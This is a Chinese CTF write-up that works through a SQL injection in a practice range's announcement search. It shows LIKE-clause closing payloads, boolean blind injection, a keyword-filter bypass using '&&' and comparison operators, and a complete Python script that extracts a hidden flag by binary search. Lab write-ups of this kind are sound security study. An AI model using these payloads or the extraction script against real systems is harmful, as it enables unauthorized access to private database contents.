---
title: 好靶场EDU搜索
published: 2026-02-28T00:00:00.000Z
updated: 2026-03-01T00:00:00.000Z
tags:
  - sql注入
category: 技术-网安
draft: false
---
# 好靶场EDU搜索

## 信息收集

打开靶场是一个"好靶场网络安全大学"的官网，有首页、公告通知、教务系统登录三个功能。题目提示"注意搜索功能"，在公告通知页面 `/announcements` 找到了一个搜索框，GET 方式提交参数 `q`。

![image-20260228012234898](https://raw.githubusercontent.com/wenject/tuchuang/main/image-20260228012234898.png)

响应头暴露了后端信息：`Werkzeug/2.2.3 Python/3.7.17`，Flask 应用。

## 漏洞发现

先测搜索功能的基本行为：

- 空搜索：返回 20 条已发布公告（ID 2-21）
- 搜索"通知"：返回 13 条，标题或内容含"通知"的
- 搜索 `'`（单引号）：返回 0 条 —— 疑似 SQL 语法错误

经典测试：

```
q=' or '1'='1    → 20条（全部公告）
q=' or '1'='2    → 20条
```

两个都返回 20 条，一开始以为不是注入。后来意识到是 LIKE 语句的问题：后端 SQL 大概是 `WHERE (title LIKE '%{q}%' OR content LIKE '%{q}%') AND status='published'`，注入 `' or '1'='1` 后变成 `LIKE '%' or '1'='1%'`，`LIKE '%'` 本身就匹配所有，所以 or 后面的条件无关紧要。

换成 `%'` 闭合 LIKE 的通配符部分：

```
q=%' and '1'='1' and '%'='    → 20条 ✓
q=%' and '1'='2' and '%'='    → 0条  ✓
```

布尔盲注确认。进一步发现 SQL 外面还包了一层括号：

```
q=%') and '1'='1' and ('%'='  → 20条 ✓
q=%') or ('1'='1              → 22条！
```

## 发现隐藏公告

`%') or ('1'='1` 返回 22 条，比正常多了 2 条。对比发现多出来的是：

| ID   | 标题                         | 状态 | 日期       |
| ---- | ---------------------------- | ---- | ---------- |
| 1    | 【草稿】教务系统升级维护通知 | 草稿 | 2025-04-26 |
| 32   | flag                         | 草稿 | 2026-02-27 |

ID=32 的标题直接就是 "flag"，状态为草稿。直接访问 `/announcement?id=32` 显示"公告不存在"，详情页对草稿做了过滤。flag 应该藏在这条公告的 content 字段里。

## WAF 分析

尝试 UNION 注入提取数据时发现大量关键字被过滤：

- `union`、`select`、`order by`：所有绕过方式（大小写、双写、注释、换行）均失败
- `and`：在注入的子条件括号内被过滤
- `like`、`regexp`：被过滤
- `binary`、`collate`：被过滤
- 函数调用如 `substr()`、`length()`、`mid()`：被过滤

但发现了关键绕过点：

- `&&` 可以替代 `and`
- 比较运算符 `>`、`<`、`>=`、`<=`、`=`、`!=` 正常可用

## 布尔盲注提取 flag

利用 `&&` 和比较运算符，先确认列名：

```
%') or (id=32 && content>='') and ('%'='  → 包含ID=32 ✓
%') or (id=32 && content!='') and ('%'='  → 包含ID=32 ✓
```

content 列存在且非空。接下来用二分法逐字符提取 content：

对于每个位置，构造：

```
%') or (id=32 && content>='已知前缀+测试字符') and ('%'='
%') or (id=32 && content<'已知前缀+测试字符+1') and ('%'='
```

两个条件同时满足时，当前字符确定。每个字符约需 14 次请求（log2(94)≈7，两次比较），38 个字符总共约 500 次请求，一分钟左右跑完。

最终提取结果：`FLAG{79980A26029846DF9A306230506A0126}`

因为 MySQL 默认 collation 不区分大小写，二分法比较拿到的是大写，实际 flag 为小写。

## 完整 EXP

```python
import requests
import re

# ========== 配置 ==========
BASE = ""  # 靶机地址，如 http://x.x.x.x:8888
# ==========================

def search_ids(q):
    r = requests.get(f"{BASE}/announcements", params={"q": q}, timeout=15)
    return re.findall(r'announcement\?id=(\d+)', r.text)

def check_32(condition):
    return '32' in search_ids(f"%') or ({condition}) and ('%'='")

def extract(col, row_cond="id=32"):
    result = ""
    for pos in range(200):
        low, high = 32, 126
        found = None
        while low <= high:
            mid = (low + high) // 2
            test = (result + chr(mid)).replace("'", "''")
            if not check_32(f"{row_cond} && {col}>='{test}'"):
                high = mid - 1
                continue
            if mid < 126:
                tn = (result + chr(mid + 1)).replace("'", "''")
                if check_32(f"{row_cond} && {col}<'{tn}'"):
                    found = chr(mid)
                    break
                else:
                    low = mid + 1
            else:
                found = chr(mid)
                break
        if found is None or found == '}':
            if found == '}':
                result += found
                print(f"[{pos+1}] '}}' -> {result}")
            break
        result += found
        print(f"[{pos+1}] '{found}' -> {result}")
    return result

# Step 1: 注入绕过status过滤，发现隐藏草稿公告
print("[*] 注入搜索，发现隐藏公告...")
ids = search_ids("%') or ('1'='1")
print(f"[+] 共 {len(ids)} 条公告，含隐藏草稿: ID=32(flag)")

# Step 2: 布尔盲注 + 二分法提取 ID=32 的 content
print("\n[*] 二分法盲注提取 ID=32 content...")
flag = extract("content")
# MySQL默认不区分大小写，实际flag为小写
print(f"\n[+] Flag: {flag.lower()}")
```
